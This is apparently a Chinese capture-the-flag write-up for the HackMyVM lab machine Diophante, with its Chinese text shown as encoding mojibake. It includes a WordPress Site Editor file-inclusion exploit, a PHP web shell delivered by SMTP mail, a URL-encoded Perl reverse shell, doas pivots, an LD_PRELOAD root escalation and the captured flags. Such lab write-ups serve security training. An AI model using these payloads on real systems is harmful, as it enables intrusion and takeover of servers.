---
{"created":"2024-12-21T15:59:33.816+08:00","tags":["HMV","LDåŠ«æŒ","WordPress","LFI","smtp"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸","ä½œè€…":"cromiphi","aliases":null,"ç³»ç»Ÿ":"Linux","permalink":"/24-æ¸—é€/HMV/44. Diophante/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/44. Diophante#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/44. Diophante#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
	- [[24-æ¸—é€/HMV/44. Diophante#2.1. ç«¯å£æ‰«æ\|2.1. ç«¯å£æ‰«æ]]
	- [[24-æ¸—é€/HMV/44. Diophante#2.2. ç›®å½•æ‰«æ\|2.2. ç›®å½•æ‰«æ]]
	- [[24-æ¸—é€/HMV/44. Diophante#2.3. knock\|2.3. knock]]
- [[24-æ¸—é€/HMV/44. Diophante#3. WordPressåˆ©ç”¨\|3. WordPressåˆ©ç”¨]]
	- [[24-æ¸—é€/HMV/44. Diophante#3.1. wpscanæ‰«æ\|3.1. wpscanæ‰«æ]]
	- [[24-æ¸—é€/HMV/44. Diophante#3.2. smtpä¸Šä¼ åé—¨\|3.2. smtpä¸Šä¼ åé—¨]]
- [[24-æ¸—é€/HMV/44. Diophante#4. ææƒ\|4. ææƒ]]
	- [[24-æ¸—é€/HMV/44. Diophante#4.1. ææƒleonardç”¨æˆ·\|4.1. ææƒleonardç”¨æˆ·]]
	- [[24-æ¸—é€/HMV/44. Diophante#4.2. LDåŠ«æŒææƒroot\|4.2. LDåŠ«æŒææƒroot]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Diophante
**ä½œè€…** [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
**éš¾åº¦** â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸

## 2. ä¿¡æ¯æ”¶é›†
### 2.1. ç«¯å£æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap 192.168.56.13 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:01 EST
Nmap scan report for 192.168.56.13
Host is up (0.0031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp open     ssh
25/tcp filtered smtp
80/tcp open     http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds

```
25 ç«¯å£è¢«é˜²ç«å¢™è¿‡æ»¤äº† å¤šåŠæ˜¯éœ€è¦knock

### 2.2. ç›®å½•æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# dirsearch -u http://192.168.56.13
^[[A/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.13/_24-12-21_05-06-58.txt

Target: http://192.168.56.13/

[05:06:58] Starting:
[05:06:59] 403 -  278B  - /.ht_wsr.txt
[05:06:59] 403 -  278B  - /.htaccess.orig
[05:06:59] 403 -  278B  - /.htaccess.bak1
[05:06:59] 403 -  278B  - /.htaccess.save
[05:06:59] 403 -  278B  - /.htaccess.sample
[05:06:59] 403 -  278B  - /.htaccess_extra
[05:06:59] 403 -  278B  - /.htaccess_orig
[05:06:59] 403 -  278B  - /.htaccess_sc
[05:06:59] 403 -  278B  - /.htaccessOLD
[05:06:59] 403 -  278B  - /.htaccessBAK
[05:06:59] 403 -  278B  - /.htaccessOLD2
[05:06:59] 403 -  278B  - /.htm
[05:06:59] 403 -  278B  - /.htpasswd_test
[05:06:59] 403 -  278B  - /.html
[05:06:59] 403 -  278B  - /.htpasswds
[05:06:59] 403 -  278B  - /.httr-oauth
[05:06:59] 403 -  278B  - /.php
[05:07:05] 301 -  313B  - /blog  ->  http://192.168.56.13/blog/
[05:07:09] 200 -    3KB - /blog/wp-login.php
[05:07:09] 200 -    5KB - /blog/
[05:07:15] 403 -  278B  - /server-status
[05:07:15] 403 -  278B  - /server-status/

Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# gobuster dir -u http://192.168.56.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/blog                 (Status: 301) [Size: 313] [--> http://192.168.56.13/blog/]
/note.txt             (Status: 200) [Size: 36]

```
### 2.3. knock
/note.txt
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# curl http://192.168.56.13/note.txt
Don't forget: 7000 8000 9000

admin
```
è¿™åº”è¯¥å°±æ˜¯è¦æ•²é—¨çš„ç«¯å£
```bash

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# knock 192.168.56.13 7000 8000 9000 -v
hitting tcp 192.168.56.13:7000
hitting tcp 192.168.56.13:8000
hitting tcp 192.168.56.13:9000

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# nmap 192.168.56.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:18 EST
Nmap scan report for 192.168.56.13
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds

```
## 3. WordPressåˆ©ç”¨
å‘ç°å­˜åœ¨wp-login è·¯å¾„ å¤šåŠå­˜åœ¨ `WordPress` æœåŠ¡


![wg0pmbjq28a](/img/user/24-æ¸—é€/HMV/assets/a7u4tewdaek.png)

æŸ¥çœ‹æºç å¯ä»¥å‘ç°ä¸€ä¸ªåŸŸå `hard`
![7lzau0bx3eu](/img/user/24-æ¸—é€/HMV/assets/4ffjhly5t19.png)
æ·»åŠ ä¸€ä¸‹

### 3.1. wpscanæ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# wpscan --url http://hard/blog --api-token xxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://hard/blog/ [192.168.56.13]
[+] Started: Sat Dec 21 05:26:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://hard/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://hard/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://hard/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://hard/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://hard/blog/?feed=rss2, <generator>https://wordpress.org/?v=5.7</generator>
 |  - http://hard/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.7</generator>
 |
 | [!] 44 vulnerabilities identified:

[+] site-editor
 | Location: http://hard/blog/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://hard/blog/wp-content/plugins/site-editor/readme.txt

```
é‡Œé¢å¯ä»¥æ£€æµ‹åˆ°site-editorå­˜åœ¨æ’ä»¶å­˜åœ¨ä¸€ä¸ªLFI
ç„¶åå¯ä»¥æ‰¾åˆ°è¿™ä¸ªCVEçš„åˆ©ç”¨ 
https://www.exploit-db.com/exploits/44340
éªŒè¯ä¸€ä¸‹å‘ç°å­˜åœ¨å¯ä»¥åˆ©ç”¨
```txt
http://192.168.56.13/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
![rpo1ftx3bek](/img/user/24-æ¸—é€/HMV/assets/rrborcsuye.png)

### 3.2. smtpä¸Šä¼ åé—¨
æˆ‘ä»¬è·å–åˆ°äº†ä¸€ä¸ªLFI
ä½†æ˜¯ç°åœ¨éœ€è¦åˆ©ç”¨è¿™ä¸ªå¼¹ä¸€ä¸ªshell

è¿™é‡Œæˆ‘æƒ³åˆ°äº†æˆ‘ä»¬ç«¯å£æ‰«ææ—¶ å¼€æ”¾çš„25ç«¯å£ SMTPé‚®ä»¶æœåŠ¡
æˆ‘ä»¬åˆ©ç”¨SMTPé‚®ä»¶æœåŠ¡ å‘é€ä¸€ä¸ªåé—¨é‚®ä»¶ ç„¶åå¯¹å…¶è¿›è¡Œæ–‡ä»¶åŒ…å«
> è¿™é‡Œéœ€è¦é€‰æ‹©ä¸€ä¸ªæ¥å—é‚®ä»¶çš„ç”¨æˆ·ï¼Œç”¨æˆ·å¯ä»¥åœ¨/etc/passwdé‡Œé¢è·å–

```bash
apt install postfix


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# nc 192.168.56.14 25
220 debian ESMTP Postfix (Debian/GNU)
helo xxx
250 debian
mail from:<kali>
250 2.1.0 Ok
rcpt to: sabine
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']);?>
.
250 2.0.0 Ok: queued as B952B802CC
quit
221 2.0.0 Bye


```
> [!warning]
> é‚®ä»¶å‘é€è¿‡å¤šä¼šå¯¼è‡´logæ–‡ä»¶æŸåï¼Œéœ€è¦é‡ç½®é¶æœºæ‰è¡Œ
> rcpt to: sabine åé¢çš„æ¥å—è€…æ˜¯å›ºå®šçš„ ä¸èƒ½ä»»æ„ï¼Œå¿…é¡»æ˜¯ç›®æ ‡é¶æœºä¸Šçš„ç”¨æˆ·
> mail from:`<kali>` è¿™é‡Œåé¢çš„å‘é€è€…å¯ä»¥ä»»æ„ï¼Œä½†ä¸€å®šè¦ç”¨`< >`æ‹¬èµ·æ¥

æˆ‘ä»¬ä½¿ç”¨ `Postfix` å‘é€é‚®ä»¶ï¼šé‚®ä»¶é€šå¸¸å­˜å‚¨åœ¨ `/var/spool/mail/<ç”¨æˆ·å>` æˆ– `/var/mail/<ç”¨æˆ·å>` ä¸­ã€‚


ç„¶åè®¿é—®
http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=id
å³å¯RCE

å¼¹shell
```bash
curl http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# pwncat-cs -lp 1234

[08:40:32] Welcome to pwncat ğŸˆ!                                                        __main__.py:164
[08:40:59] received connection from 192.168.56.14:42498                                      bind.py:84
[08:41:00] 192.168.56.14:42498: registered new host w/ db                                manager.py:957
(local) pwncat$
(remote) www-data@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebui
lder/includes$

```
## 4. ææƒ
### 4.1. ææƒleonardç”¨æˆ·
æ£€æµ‹å‘ç°æœ‰ doas çš„SUIDæƒé™
æˆ‘ä»¬çœ‹çœ‹doasçš„é…ç½®æ–‡ä»¶
```bash
(remote) www-data@diophante:/home/leonard$ cat /etc/doas.conf
permit nopass www-data as sabine cmd /usr/bin/setsid
permit nopass sabine as leonard cmd /usr/bin/mutt
```

å…è®¸æˆ‘ä»¬ä»¥ `www-data` ç”¨æˆ· ç”¨ `sabine` ç”¨æˆ·çš„æƒé™æ‰§è¡Œ `/usr/bin/setsid`
å…è®¸æˆ‘ä»¬ä»¥ `sabine` ç”¨æˆ· ç”¨ `leonard` ç”¨æˆ·çš„æƒé™æ‰§è¡Œ `/usr/bin/mutt`

å…ˆåˆ©ç”¨ `/usr/bin/setsid` æå–åˆ° `sabine` ç”¨æˆ·

```bash
(remote) www-data@diophante:/home/leonard$ doas -u sabine /usr/bin/setsid bash
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
sabine@diophante:/home/leonard$ whoami
sabine

```

ç„¶åææƒåˆ° `leonard` ç”¨æˆ·
```bash
sabine@diophante:/home/leonard$ doas -u leonard /usr/bin/mutt
è¾“å…¥ï¼å›è½¦
leonard@diophante:~$ whoami
leonard

leonard@diophante:~$ cat user.txt
Thonirburarnlog

```

### 4.2. LDåŠ«æŒææƒroot
```bash
leonard@diophante:~$ sudo -l
Matching Defaults entries for leonard on diophante:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User leonard may run the following commands on diophante:
    (ALL : ALL) NOPASSWD: /usr/bin/ping

```
å‘ç°æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œ/usr/bin/ping
å…¶ä¸­ `env_keep+=LD_PRELOAD` è¿è¡Œæˆ‘ä»¬è¿›è¡ŒLDåŠ«æŒ

å½“æˆ‘ä»¬ä½¿ç”¨ `Ping` å‘½ä»¤æ—¶ï¼Œå°±ä¼šè°ƒç”¨å¾ˆå¤šåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼ˆ.soæ–‡ä»¶ï¼‰é‡Œé¢çš„å‡½æ•°ï¼Œè€Œ `LD_PRELOAD` è¿™ä¸ªç¯å¢ƒå˜é‡å…è®¸æˆ‘ä»¬æŒ‡å®šä¼˜å…ˆè°ƒç”¨çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œæ›¿æ¢é‡Œé¢è¢«è°ƒç”¨å‡½æ•°çš„åŠŸèƒ½ï¼Œç„¶åè®©å…¶ `ping` ä»¥rootç”¨æˆ·è¿è¡Œè¿™ä¸ªå‡½æ•° å®ç°ææƒ

é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å–åˆ°ä¸€ä¸ª `ping` å‘½ä»¤æ—¶ä¸€å®šä¼šæ‰§è¡Œå‡½æ•°
idaåç¼–è¯‘ `ping`
è¿™é‡Œæˆ‘é€‰æ‹© `getopt` å‡½æ•°ã€‚å› ä¸ºä»–çš„ä½œç”¨æ˜¯è·å–å‚æ•°ã€‚æ‰€ä»¥åŸºæœ¬ä¸Šä¸€å®šä¼šè¢«è°ƒç”¨
![48as789f2nw](/img/user/24-æ¸—é€/HMV/assets/fvn9koz8vu6.png)

ç¼–è¯‘æ¶æ„soæ–‡ä»¶
```c
int getopt(char *s){
	setuid(0);
	setgid(0);
	system("chmod +s /bin/bash");
}

gcc a.c  -o pwn.so -shared
```
> è¿™é‡Œæˆ‘ç”¨Kali2024çš„ç¼–è¯‘ä¸è¡Œ
> ä¼šæŠ¥é”™
![3unullx7pde](/img/user/24-æ¸—é€/HMV/assets/ht1kx2925cl.png)

å¯ä»¥æ¢ä¸€ä¸ªç‰ˆæœ¬ ã€‚åº”è¯¥æ˜¯gccç‰ˆæœ¬çš„é—®é¢˜ã€‚
![2nxzmfir7ua](/img/user/24-æ¸—é€/HMV/assets/58mq0y0jcua.png)

ç„¶åæŠŠç¼–è¯‘åçš„ `pwn.so` ä¼ ä¸Šå»å°±è¡Œäº†
```bash
sudo -u root LD_PRELOAD=/tmp/pwn.so /usr/bin/ping 1.1.1.1

des$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
leonard@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/inclu
des$ bash -p

bash-5.0# whoami
root
bash-5.0# ls /root
root.txt
bash-5.0# cat /root/root.txt
Culcelborlus

```